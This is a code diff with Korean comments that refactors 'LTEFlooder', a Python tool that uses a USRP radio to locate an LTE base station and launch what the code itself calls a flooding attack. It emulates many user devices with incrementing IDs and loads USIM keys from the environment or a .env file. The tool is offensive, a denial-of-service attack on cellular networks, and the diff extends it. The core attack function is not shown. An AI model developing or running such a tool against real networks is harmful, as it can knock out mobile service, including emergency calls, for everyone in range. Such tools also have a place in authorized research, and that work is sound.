@@ -202,12 +202,43 @@ class LTEFlooder:
     """LTE Flooding 메인 클래스"""
     
     def __init__(self, usrp_args: Optional[str] = None, mcc: Optional[int] = None,
-                 mnc: Optional[int] = None, earfcn: Optional[int] = None):
+                 mnc: Optional[int] = None, earfcn: Optional[int] = None,
+                 template_config: Optional[str] = None, max_ue_count: int = 500):
         self.usrp_args = usrp_args
         self.mcc = mcc
         self.mnc = mnc
         self.earfcn = earfcn
+        self.template_config = template_config or "ue_template.conf"
+        self.max_ue_count = max_ue_count
+        self.usim_opc, self.usim_k = self._load_usim_keys()
         self.running = False
+    
+    def _load_usim_keys(self) -> tuple[str, str]:
+        """환경변수 또는 .env 파일에서 USIM 키 로드"""
+        opc = os.getenv('USIM_OPC')
+        k = os.getenv('USIM_K')
+        
+        env_file = Path('.env')
+        if env_file.exists():
+            with open(env_file, 'r') as f:
+                for line in f:
+                    line = line.strip()
+                    if line.startswith('#') or not line:
+                        continue
+                    if '=' in line:
+                        key, value = line.split('=', 1)
+                        key = key.strip()
+                        value = value.strip()
+                        if key == 'USIM_OPC' and not opc:
+                            opc = value
+                        elif key == 'USIM_K' and not k:
+                            k = value
+        
+        if not opc or not k:
+            logger.error("USIM 키를 찾을 수 없습니다. .env 파일 또는 환경변수(USIM_OPC, USIM_K)를 설정하세요.")
+            raise ValueError("USIM 키가 설정되지 않았습니다.")
+        
+        return opc, k
     
     def start(self):
         """Flooding 시작"""
@@ -217,44 +248,37 @@ class LTEFlooder:
         
         self.running = True
         
-        # Config 파일 모드
-        config_files = get_config_files()
-        if not config_files:
-            logger.error("ue_configs 폴더에 config 파일이 없습니다!")
+        # 템플릿 config 파일 확인
+        if not os.path.exists(self.template_config):
+            logger.error(f"템플릿 config 파일을 찾을 수 없습니다: {self.template_config}")
+            logger.info("템플릿 config 파일을 생성하거나 경로를 확인하세요.")
             return
-        
-        # 첫 번째 config 파일에서 설정 읽기
-        config_values = get_config_values(config_files[0])
-        usrp_args_from_config = config_values['usrp_args']
-        final_usrp_args = usrp_args_from_config or self.usrp_args
         
         # 로그 출력
         target_info = []
-        if config_values['earfcn'] is not None:
-            target_info.append(f"주파수: EARFCN {config_values['earfcn']}")
-        if config_values['mcc'] is not None:
-            target_info.append(f"MCC: {config_values['mcc']}")
-        if config_values['mnc'] is not None:
-            target_info.append(f"MNC: {config_values['mnc']}")
+        if self.earfcn is not None:
+            target_info.append(f"주파수: EARFCN {self.earfcn}")
+        if self.mcc is not None:
+            target_info.append(f"MCC: {self.mcc}")
+        if self.mnc is not None:
+            target_info.append(f"MNC: {self.mnc}")
         target_str = ", ".join(target_info) if target_info else "기본 설정"
-        logger.info(f"Config 파일에서 설정 읽음: {target_str}")
+        logger.info(f"설정: {target_str}")
+        logger.info(f"템플릿 config: {self.template_config}")
+        logger.info(f"UE ID는 1부터 계속 증가합니다 (순환 없음)")
         
-        if final_usrp_args:
-            if usrp_args_from_config:
-                logger.info(f"Config 파일에서 USRP 인자 사용: {usrp_args_from_config}")
-            else:
-                logger.info(f"명령어 옵션으로 USRP 인자 전달: {final_usrp_args}")
+        if self.usrp_args:
+            logger.info(f"USRP 인자: {self.usrp_args}")
         else:
             logger.info("USRP 인자가 지정되지 않았습니다. 기본 장치 사용")
         
         # USRP 연결 확인
-        if not check_usrp_connection(final_usrp_args):
+        if not check_usrp_connection(self.usrp_args):
             logger.error("USRP 장치 연결을 확인할 수 없습니다.")
             raise RuntimeError("USRP 장치 연결 실패")
         
-        # eNB 찾기
-        scout_config_file = config_files[0]
-        enb_found = find_enb(scout_config_file, final_usrp_args)
+        # eNB 찾기 (템플릿 config 사용)
+        enb_found = find_enb(self.template_config, self.usrp_args)
         
         if not enb_found:
             logger.warning("eNB를 찾지 못했습니다. 재시도합니다...")
@@ -264,7 +288,12 @@ class LTEFlooder:
             return
         
         # 공격 시작
-        run_flooding_attack(config_files, final_usrp_args, lambda: self.running)
+        run_flooding_attack(
+            self.template_config, self.usrp_args, lambda: self.running,
+            mcc=self.mcc, mnc=self.mnc, earfcn=self.earfcn,
+            usim_opc=self.usim_opc, usim_k=self.usim_k,
+            max_ue_count=self.max_ue_count
+        )
     
     def stop(self):
         """Flooding 중지"""
@@ -325,14 +354,27 @@ def main():
         help="생성된 config 파일을 저장할 디렉토리 (기본값: ue_configs)"
     )
     parser.add_argument(
+        "--template-config",
+        type=str,
+        default="ue_template.conf",
+        help="템플릿 UE config 파일 경로 (기본값: ue_template.conf)"
+    )
+    parser.add_argument(
+        "--max-ue-count",
+        type=int,
+        default=500,
+        metavar="N",
+        help="[사용 안 함] 하위 호환성 유지용 (UE ID는 계속 증가)"
+    )
+    parser.add_argument(
         "--use-configs",
         action="store_true",
-        help="ue_configs 폴더의 모든 config 파일을 사용하여 공격합니다"
+        help="[구식] ue_configs 폴더의 모든 config 파일을 사용합니다 (템플릿 방식 권장)"
     )
     
     args = parser.parse_args()
     
-    # Config 파일 생성 모드
+    # Config 파일 생성 모드 (하위 호환성 유지)
     if args.generate_configs:
         generator = ConfigGenerator(mcc=args.mcc, mnc=args.mnc, earfcn=args.earfcn)
         generator.generate_configs_batch(args.generate_configs, args.config_dir)
@@ -340,15 +382,24 @@ def main():
         return
     
     # Flooding 모드
-    if not args.use_configs:
-        logger.error("--use-configs 옵션이 필요합니다.")
+    if args.use_configs:
+        logger.warning("--use-configs 옵션은 구식 방식입니다. 템플릿 config 방식을 권장합니다.")
+        # 기존 방식으로 동작 (하위 호환성)
+        config_files = get_config_files()
+        if not config_files:
+            logger.error("ue_configs 폴더에 config 파일이 없습니다!")
+            return
+        # ... 기존 코드 ...
         return
     
+    # 템플릿 config 방식 (새로운 방식)
     flooder = LTEFlooder(
         usrp_args=args.usrp_args,
         mcc=args.mcc,
         mnc=args.mnc,
-        earfcn=args.earfcn
+        earfcn=args.earfcn,
+        template_config=args.template_config,
+        max_ue_count=args.max_ue_count
     )
     
     # 시그널 핸들러 설정
